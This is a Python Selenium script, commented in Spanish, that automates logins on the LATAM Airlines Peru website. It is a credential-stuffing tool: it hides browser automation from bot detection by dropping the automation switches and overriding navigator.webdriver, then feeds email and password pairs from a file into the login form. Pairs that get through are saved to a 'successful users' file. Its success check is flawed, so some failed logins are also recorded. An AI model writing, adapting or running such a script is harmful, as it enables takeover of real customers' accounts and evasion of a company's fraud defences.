from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
import time

# Configurar el navegador
chrome_options = Options()
chrome_options.add_experimental_option("detach", True)
chrome_options.add_argument("--disable-gpu")

# ⚠️ Desactivar la detección de automatización
chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
chrome_options.add_experimental_option('useAutomationExtension', False)

# Iniciar el navegador
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)

# Inyectar script para ocultar la automatización
driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
    "source": """
    Object.defineProperty(navigator, 'webdriver', {
        get: () => undefined
    })
    """
})

# Abrir la página
driver.get("https://www.latamairlines.com/pe/es")
time.sleep(5)

# Hacer clic en el botón de inicio de sesión
WebDriverWait(driver, 10).until(
    EC.element_to_be_clickable((By.ID, "header__profile__lnk-sign-in"))
).click()
print("Se hizo clic en el botón de inicio de sesión.")
time.sleep(5)

# Leer el archivo de usuarios
# Leer el archivo de usuarios
with open("usuarios.txt", "r") as archivo:
    for linea in archivo:
        # Eliminar espacios en blanco y saltos de línea
        linea = linea.strip()
        
        # Asegurarse de que la línea tenga el formato correcto (con ",")
        if "," in linea:
            correo, clave = linea.split(",", 1)  # Usar coma para dividir

            # Ingresar correo
            input_correo = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "form-input--alias"))
            )
            input_correo.clear()
            input_correo.send_keys(correo)
            print(f"Correo ingresado: {correo}")

            time.sleep(2)

            # Hacer clic en el botón de continuar
            boton_login = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.ID, "primary-button"))
            )
            boton_login.click()
            print(f"Se presionó el botón de login para {correo}")

            time.sleep(5)

            try:
                # Verificar si el campo de contraseña está presente (significa que el correo existe)
                input_clave = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.ID, "form-input--password"))
                )
                input_clave.clear()
                input_clave.send_keys(clave)
                print(f"Password ingresado: {correo}")

                time.sleep(2)

                # Hacer clic en el botón de continuar
                boton_login = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.ID, "primary-button"))
                )
                boton_login.click()
                print(f"Se presionó el botón de login para {correo}")

                time.sleep(5)

                # Si hemos llegado hasta aquí, el login fue exitoso
                with open("usuarios_exitosos.txt", "a") as archivo_exitoso:
                    archivo_exitoso.write(f"{correo},{clave}\n")
                print(f"Usuario {correo} registrado como exitoso.")

            except Exception as e:
                # Si el campo de contraseña no aparece, significa que el correo no existe o hubo un error
                print(f"Fallo al iniciar sesión con el correo {correo}, intentando el siguiente usuario. Error: {e}")
        
            # Volver a la página inicial para continuar con el siguiente usuario
            driver.get("https://www.latamairlines.com/pe/es")
            time.sleep(5)

            # Hacer clic en el botón de inicio de sesión nuevamente
            WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.ID, "header__profile__lnk-sign-in"))
            ).click()

            print("Se hizo clic en el botón de inicio de sesión.")
            time.sleep(5)
        else:
            # Si la línea no tiene el formato esperado, se ignora o se imprime un mensaje
            print(f"Línea ignorada (formato incorrecto): {linea}")

print("Termino la ejecución")
input("Presiona cualquier tecla para terminar")
time.sleep(1)
driver.quit()
